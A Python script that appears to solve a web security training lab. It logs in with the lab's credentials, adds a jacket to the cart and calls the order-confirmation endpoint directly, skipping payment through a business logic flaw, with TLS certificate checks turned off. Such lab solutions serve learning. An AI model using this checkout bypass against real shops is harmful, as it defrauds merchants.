import sys
import urllib3
import requests

from utils import login


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def buy_item(session: requests.Session, url: str):
    url = url.rstrip("/")
    
    # 1) Login
    print("(+) Trying to login...")
    login(session, f"{url}/login", username="wiener", password="peter")
    print("(+) Successfuly logged-in.")
    
    # 2) Add item to cart
    print("(+) trying to add \"Lightweight l33t leather jacket\" to cart...")
    data = {"productId": "1",
            "redir": "PRODUCT",
            "quantity": "1"}
    response = session.post(f"{url}/cart", data=data, verify=False)
    if response.status_code != 200:
        raise RuntimeError("(-) Couldn't add \"Lightweight l33t leather jacket\" to cart!")
    print("(+) Item successfuly added.")

    # 3) Confirm order
    ## GET /cart/order-confirmation?order-confirmed=true
    print("(+) Trying to buying the item...")
    response = session.get(f"{url}/cart/order-confirmation?order-confirmed=true", verify=False)
    if response.status_code != 200:
        raise RuntimeError("(-) Couldn't buy the item!")
    print("(+) The item successfuly purchased.")

    # 4) confirm lab solve status
    if "Congratulations" in response.text:
        print("(+) Successfully exploited the business logic vulnerability.")
    else:
        print("(-) Could not exploit the business logic vulnerability!")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage : {sys.argv[0]} <url>")
        sys.exit(-1)
    session = requests.Session()
    buy_item(session, sys.argv[1])

main()
